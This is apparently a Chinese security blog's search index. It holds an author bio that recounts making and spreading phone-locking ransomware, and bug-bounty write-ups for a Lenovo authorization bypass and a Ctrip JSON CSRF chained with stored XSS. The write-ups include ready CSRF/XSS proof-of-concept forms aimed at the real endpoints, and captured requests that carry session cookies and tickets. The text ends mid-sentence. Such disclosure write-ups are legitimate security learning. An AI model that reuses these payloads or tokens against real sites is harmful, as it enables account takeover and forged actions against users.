<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>about_me</title>
      <link href="/2018/07/05/about-me/"/>
      <url>/2018/07/05/about-me/</url>
      <content type="html"><![CDATA[<blockquote><p>害羞不给看 哈哈哈:)</p></blockquote><a id="more"></a><h3 id="First、"><a href="#First、" class="headerlink" title="First、"></a>First、</h3><p>Thank~ 承蒙看得起</p><h3 id="2016年"><a href="#2016年" class="headerlink" title="2016年"></a>2016年</h3><p>记得那年暑假的时候，爱上了玩手机，然后也喜欢打游戏，不知不觉中就知道了存在那么一个软件，他叫<strong>葫芦娃</strong>，里面有一个社区记得那里面很多都是分享软件的，如 破解过的小游戏、免费看VIP电影、免流等，然后我就天天喜欢在这里下载一下软件用，可是，，，直到有一天，我下载一个游戏破解器的时候，就下载了一个锁机软件（普遍入坑剧情），里面挂着 V字仇杀队的图片，写着:<br><code>hacker by xxxx</code><br>，我很慌张，因为手机是我妈妈的，然后我当时也不知道是哪里借的钱，发给了锁机作者（20元，那个时候对我来说就是要命啊），然后那个锁机的作者不但没有给我解锁，还说还变成他徒弟（30元）才可以帮忙解锁，可是我那个时候是真的没那么多钱，我就一直在求他，结果就是他屏蔽我了，钱也没退还。然后到最后面也没解决，还是拿去手机店才给恢复的。</p><p>经过上次那个事情后，我一直记在心里面，直到有一天偷跑去网吧上网后，我去搜索了一下hacker by关键词，发现有很多个，然后我打开了几个，发现页面上全是炫酷的文字炫酷的英语炫酷的背景（黑页），瞬间觉得帅气吊炸天，然后又去搜索什么黑客什么入侵之类的，我发现是真的喜欢。然后回到家后，就拿我妈手机喊着学黑客什么的，然后然后买了一本书，《黑客入门到精通》，但是买了没怎么看，其中原因是我在封闭式学校读书没时间可以看，但是我心目中就是留下一个印象，然后到快上初二的时候，经过某些事情（复杂说不清），我也开始学着做锁机（AIDE写的锁机源码然后修改一些信息就变成我的了，哈哈哈）然后也是到处发给别人，然后不知道怎么地就满满的加入了各大黑客群（娱乐圈），并且每天装逼，吹牛逼，日复一日的过着，然后有一天那个群主找了我给我当了管理员（因为我老是偷源码改源码然后别人问我锁机是怎么搞的我都说我做的），然后有一天，某个大黑客进了群，在闹场，说打黑客技术，打五项之类的，然后那个群主（因为他只会搞安卓开发）就喊我（我每天吹牛说我是黑客。。。。）来和他比比试试，我当时就结巴了，不知道如何回答。。。。 然后我就找借口说我在工作，过几天吧，然后这几天我就疯狂的在看一些黑客知识，然后学来学去只会用 啊D，御剑、穿山甲 我发现根本没希望打赢，我就默默的退群了，也换了个QQ号，觉得自己以后都不能再装逼了，打脸的感觉实在太痛了。</p><h3 id="2017年"><a href="#2017年" class="headerlink" title="2017年"></a>2017年</h3><p>在这一年里，也并没有接触安全这行业，而是接触的前端开发~（我也不知道我怎么就接触到前端的，估计是黑页太炫酷了） 然后我就在学html，css，javascript（没怎么学），jquery，也写出过某官网首页，虽然是惨不忍睹，但是很有自豪感。可是这种感觉并不长久，因为自己太花心，但是又有人说易语言多么厉害可以写电脑锁机软件，我又跑去学，然后那个时候又了解到Python和Ruby语言很厉害，当黑客必备，我就又跑去学了，这次学的比较久，可能是Py语言比较好玩把，但是我只是每个星期的星期日才能去网吧玩电脑（封闭式学校，星期一到星期六都要上课），然后发现自己学的并不怎么好，还是放弃了，直到新年的时候，我正在的想去接触安全，因为当时看了什么 网络安全人才培养（其中内容就是可以去什么大学之类的） 这些，我发现我自己是不是也可以去学一学说不定我可以不用成绩（我成绩很差。。）考就去那些好的大学读书呢，然后还是拖到了18年</p><h3 id="2018年"><a href="#2018年" class="headerlink" title="2018年"></a>2018年</h3><p>在这一年里，因为随着生理成长以及一些生活上的困惑后我内心成长了不少（这让我非常开心，因为看清了现在要做的事情）</p><p>然后就是在一月份的时候，我去学习了Web安全，经过了几个月的时间学习（过程省略。。因为多半时间又在吹牛逼），发现自己的确是学的不少了，令我最开心的是，在学习渗透的时候，遇到了许多志同道合的人，愿意一起努力，一起成长。然后经过一段时间的磨练后，我也尝试在漏洞盒子上挖掘一些漏洞（也就是半个月前），然后第一个挖掘的漏洞就是联想的Csrf漏洞，我但是是真的乐坏了，又拿着截图到处装逼去，因为喜欢上了挖到漏洞的感觉（优越感、自豪感、可装逼感），这里我引入一句HackOne的白帽子的一句话：<strong>开心去玩耍，大胆去尝试，不要尝试模仿别人或一心只想成功，因为如果这是属于你的Bug，你总会发现的，在这个过程中，你会得到更多的乐趣。</strong></p><p>接着就在最近的时间里（其中休息了4天）不断的挖掘（运气非常好），我挖到了有<code>1.1k</code>，如图<br><img src="http://static.zybuluo.com/1kbfree/ral9zsa1a2iq04d3kxexcuwa/image_1chktj5avoje1gu212mt159u10a69.png" alt="image_1chktj5avoje1gu212mt159u10a69.png-32.3kB"><br>这让我非常的开心，所以我也希望在未来的日子里可以挖掘到更多的漏洞，并且离我的梦想更近一步。</p><h3 id="学习阻扰"><a href="#学习阻扰" class="headerlink" title="学习阻扰"></a>学习阻扰</h3><p>其实学习阻扰还是挺多的。</p><p>1、因为家里是在农村，科技并不发达，早期时间爸妈还是很针对我学这个的，但是因为我的坚持不懈，他们现在不支持我学也没办法了，事实证明坚持下来还是有用的</p><p>2、同学们不理解，经常对我冷嘲热讽，但是无所谓，毕竟这些事情是看结果的</p><p>3、还是因为家里是农村并且没什么钱，所以想去参加一些会议也是凉凉的</p><p>4、就是到目前的时期，感觉自己不知道再学习什么好，感觉处于瓶颈期，如果大佬们愿意，可以多来帮忙指导我一下，万分感谢。</p><h3 id="座右铭"><a href="#座右铭" class="headerlink" title="座右铭"></a>座右铭</h3><p>十年寒窗无人问，一举成名天下知</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      
    </entry>
    
    <entry>
      <title>漏洞挖掘经验|联想商城某处存在ID越权授权</title>
      <link href="/2018/06/22/%E8%81%94%E6%83%B3%E5%95%86%E5%9F%8E%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8ID%E8%B6%8A%E6%9D%83%E6%8E%88%E6%9D%83/"/>
      <url>/2018/06/22/%E8%81%94%E6%83%B3%E5%95%86%E5%9F%8E%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8ID%E8%B6%8A%E6%9D%83%E6%8E%88%E6%9D%83/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止转载！</p></blockquote><a id="more"></a><p>漏洞URL：<a href="https://account.lenovo.com/us/zh/requestaccess" target="_blank" rel="noopener">https://account.lenovo.com/us/zh/requestaccess</a></p><h5 id="我们需要注册一个账号，然后进入上述漏洞网址-如图"><a href="#我们需要注册一个账号，然后进入上述漏洞网址-如图" class="headerlink" title="我们需要注册一个账号，然后进入上述漏洞网址,如图"></a>我们需要注册一个账号，然后进入上述漏洞网址,如图</h5><p><img src="http://static.zybuluo.com/1kbfree/2qy45ucvnlrwvwhrz28dbc14/image_1cgj98rg81a4vmtlmko15kb1il629.png" alt="image_1cgj98rg81a4vmtlmko15kb1il629.png-297.2kB"></p><h5 id="我们在这里我们随便输入BID，然后用burp抓包。"><a href="#我们在这里我们随便输入BID，然后用burp抓包。" class="headerlink" title="我们在这里我们随便输入BID，然后用burp抓包。"></a>我们在这里我们随便输入BID，然后用burp抓包。</h5><p><img src="http://static.zybuluo.com/1kbfree/8j11jhnhht9n06eqmt0jq1fd/1.png" alt="1.png">  </p><h5 id="抓取返回包。"><a href="#抓取返回包。" class="headerlink" title="抓取返回包。"></a>抓取返回包。</h5><p><img src="http://static.zybuluo.com/1kbfree/flxct6ouz7h064rteflwdbat/2.png" alt="2.png">  </p><h5 id="把参数Statecode-1改为statecode-1"><a href="#把参数Statecode-1改为statecode-1" class="headerlink" title="把参数Statecode=-1改为statecode=1"></a>把参数<code>Statecode=-1</code>改为<code>statecode=1</code></h5><p><img src="http://static.zybuluo.com/1kbfree/06vpr3qdsuiptv91nanqzobs/3.png" alt="3.png">  </p><h5 id="Forward放包"><a href="#Forward放包" class="headerlink" title="Forward放包"></a>Forward放包</h5><p><img src="http://static.zybuluo.com/1kbfree/ftydy0bne3c7inrw1j6kfyfr/4.png" alt="4.png">  </p><p><em>这样的话无论我们输入BID为何值都没有用了，因为已经显示 <code>ID is already authorized</code> ，意思为该ID已经被授权。</em></p><blockquote><p>这个漏洞最主要的就是授权的时候只判断了 <code>ID</code> 的返回结果，所以导致了 <code>越权漏洞</code> 的参数</p></blockquote><p>这里吐槽一下，联想审核的第一次拒绝了我，然后我申诉，给我过了，我以为是个高危，没想到审核说<strong>越权行为已经确认产生，但是越权产生的危害不能确认，因此判定为越权行为为中风险</strong>，有点扎心</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> 内部资料 </category>
          
          <category> Web攻防 </category>
          
          <category> 作者：一条快乐的咸鱼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 越权漏洞 </tag>
            
            <tag> 实战渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>携程发游记处存在Csrf+存储Xss漏洞</title>
      <link href="/2018/06/21/%E6%90%BA%E7%A8%8B%E5%8F%91%E6%B8%B8%E8%AE%B0%E5%A4%84%E5%AD%98%E5%9C%A8Csrf-%E5%AD%98%E5%82%A8Xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2018/06/21/%E6%90%BA%E7%A8%8B%E5%8F%91%E6%B8%B8%E8%AE%B0%E5%A4%84%E5%AD%98%E5%9C%A8Csrf-%E5%AD%98%E5%82%A8Xss%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>声明：内部文章,禁止转载!</p><p>继上篇 <code>携程某处存在Json格式的Csrf漏洞发游记</code> 写完后，又挖到一个 <code>Xss</code> (某大佬提醒的),然后造成了组合拳~</p></blockquote><a id="more"></a><blockquote><p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p></blockquote><h4 id="打开URL后，页面如图"><a href="#打开URL后，页面如图" class="headerlink" title="打开URL后，页面如图"></a>打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/al09v6gv8wew83rdl4wldxu2/image_1cgh4l305int10hdkfn1pfh4489.png" alt="image_1cgh4l305int10hdkfn1pfh4489.png-483.5kB"></p><h4 id="点击上图的写游记"><a href="#点击上图的写游记" class="headerlink" title="点击上图的写游记"></a>点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p><h4 id="点击发布"><a href="#点击发布" class="headerlink" title="点击发布"></a>点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p><h4 id="选好后点击提交并且抓包"><a href="#选好后点击提交并且抓包" class="headerlink" title="选好后点击提交并且抓包"></a>选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p><p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689502</span><br><span class="line">Content-Length: 508</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.139; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529579192824.1529579227556.1529579192824.1529579227556.undefined.0.0.31.31; __zpspc=9.3.1529576375.1529579227.12%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D139%26v2%3D137; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=T; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.41; cticket=1C81168DBA3550FFB18DE9387721086ADC29F177C61F3FCDDEC332A0F561FEA1; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKgOgeTp2vPOL0poU5JHB7aZMn8dLj1VWnc06YYBrgW94hk8E69pgP+7xG9aEMLIjSajqQw9nQHaiqeULn6n6AWdH6Nx5wwmPYV+vaMlu4TmQRy40no+qH6nW0v79DvqWom85pWMuKY4cNlH+KZ0DFagL1nXMWbTg4m8Yq5UtJ0aAvGpE4MsXq6PXfRNy1Vkmc=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689502&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;111111&gt;&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689502&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p><p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p><h4 id="我们将其构造成-Csrf-Poc-这里还存在存储Xss，打包在如下POC"><a href="#我们将其构造成-Csrf-Poc-这里还存在存储Xss，打包在如下POC" class="headerlink" title="我们将其构造成 Csrf Poc,这里还存在存储Xss，打包在如下POC:"></a>我们将其构造成 <code>Csrf Poc</code>,这里还存在<code>存储Xss</code>，打包在如下<code>POC</code>:</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;h1&gt;test&lt;/h1&gt;&lt;img src=x onerror=alert(\"cookie\")&gt;","UploadPicContent":"","CoverImageId":0,"TravelId":"3689502","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"111111&gt;","IsSelected":true&#125;],"TagList":[],"TravelId":"3689502","ClassifiedType":6,"TravelDays":1111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":10&#125;,"PublishStatus":1,"Title":"love you'</span> <span class="attr">value</span>=<span class="string">'love rice"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="在浏览器打开此Poc"><a href="#在浏览器打开此Poc" class="headerlink" title="在浏览器打开此Poc"></a>在浏览器打开此<code>Poc</code></h4><p><img src="http://static.zybuluo.com/1kbfree/470vyzkxjxp23fyi7646hz7y/image_1cgh4r1rh15671iempn1e5312om.png" alt="image_1cgh4r1rh15671iempn1e5312om.png-33.8kB"></p><p>查看一下是否真的发布成功~</p><p><img src="http://static.zybuluo.com/1kbfree/wtblno93qds3vqfwhw3ob8zv/image_1cgh4sfstr0m12lu1tee65f1e6h2j.png" alt="image_1cgh4sfstr0m12lu1tee65f1e6h2j.png-176kB"></p><p>接着我们点击编辑，查看是否会触发<code>Xss</code></p><p><img src="http://static.zybuluo.com/1kbfree/ugellf0ep7tyrfscqchmyn4v/image_1cgh4tdcv1osnph9mhrrl14oo30.png" alt="image_1cgh4tdcv1osnph9mhrrl14oo30.png-205.2kB"></p><p>ok~</p><blockquote class="blockquote-center"><p>十年寒窗无人问，一举成名天下知<br>                            – Cai_Team</p></blockquote>]]></content>
      
      <categories>
          
          <category> Web攻防 </category>
          
          <category> 渗透测试 </category>
          
          <category> 作者：Iamfree </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> Json Csrf </tag>
            
            <tag> 存储Xss </tag>
            
            <tag> Web漏洞组合拳 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>携程某处存在Json格式的Csrf漏洞发游记</title>
      <link href="/2018/06/21/%E6%90%BA%E7%A8%8B%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%B8%B8%E8%AE%B0/"/>
      <url>/2018/06/21/%E6%90%BA%E7%A8%8B%E6%9F%90%E5%A4%84%E5%AD%98%E5%9C%A8Csrf%E6%BC%8F%E6%B4%9E%E5%8F%91%E6%B8%B8%E8%AE%B0/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>内部文章，禁止转载</p></blockquote><a id="more"></a><blockquote><p>URL -&gt; <a href="http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals" target="_blank" rel="noopener">http://you.ctrip.com/members/47A3D55C158041BD8D7F21A7BA084AA1/journals</a></p></blockquote><h4 id="1-打开URL后，页面如图"><a href="#1-打开URL后，页面如图" class="headerlink" title="1. 打开URL后，页面如图"></a>1. 打开URL后，页面如图</h4><p><img src="http://static.zybuluo.com/1kbfree/p6gljipfdvxyi9nqklpfywuf/image_1cggtjqgn2r21dlc128812gu1u849.png" alt="image_1cggtjqgn2r21dlc128812gu1u849.png-358.9kB"></p><h4 id="2-点击上图的写游记"><a href="#2-点击上图的写游记" class="headerlink" title="2. 点击上图的写游记"></a>2. 点击上图的写游记</h4><p><img src="http://static.zybuluo.com/1kbfree/j11j045f8xz72nmpw04kvvrd/image_1cggtlmfhq3l50r8in147aifum.png" alt="image_1cggtlmfhq3l50r8in147aifum.png-146.8kB"><br><em>点击后会进入另一个页面，如下图</em></p><h4 id="3-点击发布"><a href="#3-点击发布" class="headerlink" title="3. 点击发布"></a>3. 点击发布</h4><p><img src="http://static.zybuluo.com/1kbfree/7md936r409zlyh8ss369f99o/image_1cggtnrtg4h315d2174oi771rm413.png" alt="image_1cggtnrtg4h315d2174oi771rm413.png-80.9kB"><br><em>又又又还有一个页面</em></p><h4 id="4-选好后点击提交并且抓包"><a href="#4-选好后点击提交并且抓包" class="headerlink" title="4. 选好后点击提交并且抓包"></a>4. 选好后点击提交并且抓包</h4><p><img src="http://static.zybuluo.com/1kbfree/otd02a8z2x31i1j2udrolgco/image_1cggtquogas41v4c7keeju1p7p1g.png" alt="image_1cggtquogas41v4c7keeju1p7p1g.png-99.4kB"></p><p>抓取的数据包如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /TravelSite/Member/SaveNewTravel HTTP/1.1</span><br><span class="line">Host: you.ctrip.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Referer: http://you.ctrip.com/TravelSite/Member/EditNewTravel?travelId=3689394</span><br><span class="line">Content-Length: 519</span><br><span class="line">Cookie: _bfa=1.1529559162771.3aowri.1.1529564159709.1529575803710.3.105; adscityen=Meizhou; _RF1=120.239.228.99; _RSG=T6KJObxFMeEUqcn7NtwLW8; _RDG=2885568a6cac882bb818690bc2de21a339; _RGUID=ea163fb9-584d-419d-8815-eb75c7c66d1e; _jzqco=%7C%7C%7C%7C1529559191059%7C1.113394883.1529559190871.1529565815866.1529576375632.1529565815866.1529576375632.undefined.0.0.20.20; __zpspc=9.3.1529576375.1529576375.1%234%7C%7C%7C%7C%7C%23; MKT_Pagesource=PC; _bfi=p1%3D290606%26p2%3D290606%26v1%3D105%26v2%3D104; login_uid=92A18FCF669DF32698BF54DD2CE7E1D1; login_type=0; UUID=1508E76B015E4E609698BCA0B9CA2320; IsPersonalizedLogin=F; appFloatCnt=1; manualclose=1; ASP.NET_SessionSvc=MTAuOC4xODkuNjB8OTA5MHxqaW5xaWFvfGRlZmF1bHR8MTUyNjUzNzExNDI2Mw; bdshare_firstime=1529559824392; _abtest_userid=a62eb7c0-4054-48fa-8421-eaae213957d6; cticket=1C81168DBA3550FFB18DE9387721086AA1AB2E3206164EF5DE4BF207D9F2AE8E; ticket_ctrip=bJ9RlCHVwlu1ZjyusRi+ypZ7X2r4+yojO82DkiXyGYeP0Mg96gJEQ+LWMo18plOrPdkAeXYih6tqb1Y94QwsvBuemHYmTAK0dmQ8i4jhcqKYiDhbXtS6b1594tYlhp4+VrZJoGlAq59Sa38eZFCT3+EpL6sqTuRUM54pmZHcxmxbT82oGUQF+6luF9/OQHCxD8ehHHp4AyfgBbwPE8WZTr6KEJYMAnGc5VDEoyGx91d2l+3B3eOk3Y2gGeR7BJbvn2PtKP3/2CZEUX0mKtoYQ5utvxMGO5R+fKJN1MMgSTw=; AHeadUserInfo=VipGrade=0&amp;UserName=&amp;NoReadMessageCount=0; DUID=u=08F36DBB6DC5886589DDBB5100AD9461&amp;v=0; IsNonUser=F; ASP.NET_SessionId=tcktpejhlxfokmlnf1q1zn3j; _bfs=1.7</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;Content&quot;:&quot;&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;&quot;,&quot;Title&quot;:&quot;11111&quot;,&quot;UploadPicContent&quot;:&quot;&quot;,&quot;CoverImageId&quot;:0,&quot;TravelId&quot;:&quot;3689394&quot;,&quot;CoverLocationY&quot;:0,&quot;ClassifiedInfo&quot;:&#123;&quot;DistrictList&quot;:[&#123;&quot;DistrictId&quot;:&quot;110000&quot;,&quot;DistrictName&quot;:&quot;ä¸­å½ï¼äºæ´²&quot;,&quot;IsSelected&quot;:true&#125;,&#123;&quot;DistrictId&quot;:&quot;1&quot;,&quot;DistrictName&quot;:&quot;åäº¬ï¼ä¸­å½&quot;,&quot;IsSelected&quot;:true&#125;],&quot;TagList&quot;:[],&quot;TravelId&quot;:&quot;3689394&quot;,&quot;ClassifiedType&quot;:6,&quot;TravelDays&quot;:1111111111111,&quot;DepartureDate&quot;:&quot;2018-06-13&quot;,&quot;Consume&quot;:111,&quot;CompanionType&quot;:1&#125;,&quot;PublishStatus&quot;:1&#125;</span><br></pre></td></tr></table></figure></p><p><em>可以看到这里是由 <code>Json</code> 传递的，并且没有 <code>Token</code> 之类的验证，那么就可能会存在 <code>Csrf</code></em> </p><h4 id="5-我们将其构造成-Csrf-Poc"><a href="#5-我们将其构造成-Csrf-Poc" class="headerlink" title="5. 我们将其构造成 Csrf Poc"></a>5. 我们将其构造成 <code>Csrf Poc</code></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">history.pushState('', '', '/');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://you.ctrip.com/TravelSite/Member/SaveNewTravel"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"text/plain"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">'&#123;"Content":"&lt;p&gt;1111111111&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br/&gt;&lt;/p&gt;","Title":"11111","UploadPicContent":"","CoverImageId":0,"TravelId":"3689394","CoverLocationY":0,"ClassifiedInfo":&#123;"DistrictList":[&#123;"DistrictId":"110000","DistrictName":"涓浗锛屼簹娲�","IsSelected":true&#125;,&#123;"DistrictId":"1","DistrictName":"鍖椾含锛屼腑鍥�","IsSelected":true&#125;],"TagList":[],"TravelId":"3689394","ClassifiedType":6,"TravelDays":1111111111111,"DepartureDate":"2018-06-13","Consume":111,"CompanionType":1&#125;,"PublishStatus":1'</span> <span class="attr">value</span>=<span class="string">'"&#125;'</span> <span class="attr">type</span>=<span class="string">'hidden'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit request"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h5><p>很多人会问<code>Csrf 